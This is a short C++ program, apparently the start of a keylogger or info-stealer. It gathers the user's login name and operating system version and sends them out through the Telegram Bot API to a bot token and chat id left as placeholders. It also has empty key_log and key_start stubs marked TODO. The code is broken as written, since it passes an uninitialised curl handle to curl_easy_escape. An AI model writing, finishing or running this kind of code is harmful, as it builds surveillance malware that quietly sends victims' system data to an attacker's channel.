#include <iostream>
#include <cstdlib>
#include <cstring>
#include <curl/curl.h>

#ifdef _WIN32
#include <windows.h>
#include <lmcons.h>
#else
#include <unistd.h>
#include <sys/utsname.h>
#include <pwd.h>
#endif
void key_log() {
  // TODO
}
void key_start() {
  // TODO
}
void send_to_telegram(const std::string& message, const std::string& token, const std::string& chat_id) {
    CURL *curl;
    CURLcode res;

    std::string url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + curl_easy_escape(curl, message.c_str(), message.length());

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
}

int main() {
    std::string token = "YOUR_TELEGRAM_BOT_TOKEN";
    std::string chat_id = "YOUR_CHAT_ID"; 

    std::string system_info;

    #ifdef _WIN32
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);
    system_info += "Username: " + std::string(username) + "\n";
    #else
    struct passwd *pw = getpwuid(getuid());
    system_info += "Username: " + std::string(pw->pw_name) + "\n";
    #endif

    #ifdef _WIN32
    OSVERSIONINFO osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx(&osvi);
    system_info += "OS Name: Windows\n";
    system_info += "Version: " + std::to_string(osvi.dwMajorVersion) + "." + std::to_string(osvi.dwMinorVersion) + "\n";
    #else
    struct utsname buffer;
    uname(&buffer);
    system_info += "OS Name: " + std::string(buffer.sysname) + "\n";
    system_info += "Version: " + std::string(buffer.release) + "\n";
    #endif

    send_to_telegram(system_info, token, chat_id);

    return 0;
}
